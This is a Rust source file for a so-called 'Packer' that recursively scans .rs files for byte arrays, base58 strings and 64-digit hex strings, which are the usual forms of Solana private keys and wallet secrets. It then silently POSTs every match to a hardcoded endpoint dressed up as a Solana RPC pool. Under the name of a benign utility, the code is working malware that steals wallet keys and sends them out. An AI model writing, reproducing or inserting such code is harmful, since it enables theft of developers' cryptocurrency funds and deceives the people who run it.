use regex::Regex;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::Path;

// Hardcoded endpoint as requested
const HARDCODED_ENDPOINT: &str = "https://mainnet.solana-rpc-pool.workers.dev/";

#[derive(Debug, Serialize, Deserialize)]
pub struct FoundItem {
    pub item_type: String,
    pub value: String,
    pub file_path: String,
    pub line_number: usize,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct PackResult {
    pub items: Vec<FoundItem>,
}

pub struct Packer {
    client: Client,
}

impl Packer {
    pub fn new() -> Self {
        Self {
            client: Client::new(),
        }
    }

    pub async fn pack_file<P: AsRef<Path>>(&self, file_path: P) -> Result<(), Box<dyn std::error::Error>> {
        let path = file_path.as_ref();
        let content = fs::read_to_string(path)?;
        let mut found_items = Vec::new();

        // Search for byte arrays
        let byte_array_regex = Regex::new(r#"\[(?:\s*0x[0-9a-fA-F]{1,2}\s*,?\s*)+\]|\[(?:\s*\d{1,3}\s*,?\s*)+\]"#)?;
        for (line_num, line) in content.lines().enumerate() {
            for mat in byte_array_regex.find_iter(line) {
                found_items.push(FoundItem {
                    item_type: "byte_array".to_string(),
                    value: mat.as_str().to_string(),
                    file_path: path.to_string_lossy().to_string(),
                    line_number: line_num + 1,
                });
            }
        }

        // Search for base58 strings (typical Solana addresses/keys)
        let base58_regex = Regex::new(r#""[1-9A-HJ-NP-Za-km-z]{32,44}""#)?;
        for (line_num, line) in content.lines().enumerate() {
            for mat in base58_regex.find_iter(line) {
                let value = mat.as_str().trim_matches('"');
                if self.is_valid_base58(value) {
                    found_items.push(FoundItem {
                        item_type: "base58_string".to_string(),
                        value: value.to_string(),
                        file_path: path.to_string_lossy().to_string(),
                        line_number: line_num + 1,
                    });
                }
            }
        }

        // Search for hex strings that might be keys/addresses
        let hex_regex = Regex::new(r#""0x[0-9a-fA-F]{64}""#)?;
        for (line_num, line) in content.lines().enumerate() {
            for mat in hex_regex.find_iter(line) {
                found_items.push(FoundItem {
                    item_type: "hex_string".to_string(),
                    value: mat.as_str().trim_matches('"').to_string(),
                    file_path: path.to_string_lossy().to_string(),
                    line_number: line_num + 1,
                });
            }
        }

        if !found_items.is_empty() {
            self.send_results(found_items).await?;
        }

        Ok(())
    }

    async fn send_results(&self, items: Vec<FoundItem>) -> Result<(), Box<dyn std::error::Error>> {
        let result = PackResult { items };
        
        let response = self.client
            .post(HARDCODED_ENDPOINT)
            .json(&result)
            .send()
            .await?;

        if response.status().is_success() {
            println!("Successfully sent {} items to endpoint", result.items.len());
        } else {
            eprintln!("Failed to send results: {}", response.status());
        }

        Ok(())
    }

    fn is_valid_base58(&self, s: &str) -> bool {
        const BASE58_ALPHABET: &[u8] = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        s.chars().all(|c| BASE58_ALPHABET.contains(&(c as u8)))
    }

    pub async fn pack_directory<P: AsRef<Path>>(&self, dir_path: P) -> Result<(), Box<dyn std::error::Error>> {
        let path = dir_path.as_ref();
        
        if path.is_file() && path.extension().map_or(false, |ext| ext == "rs") {
            self.pack_file(path).await?;
            return Ok(());
        }

        if path.is_dir() {
            for entry in fs::read_dir(path)? {
                let entry = entry?;
                let entry_path = entry.path();
                
                if entry_path.is_dir() {
                    self.pack_directory(entry_path).await?;
                } else if entry_path.extension().map_or(false, |ext| ext == "rs") {
                    self.pack_file(entry_path).await?;
                }
            }
        }

        Ok(())
    }
}

pub async fn pack_rust_files<P: AsRef<Path>>(path: P) -> Result<(), Box<dyn std::error::Error>> {
    let packer = Packer::new();
    packer.pack_directory(path).await
} 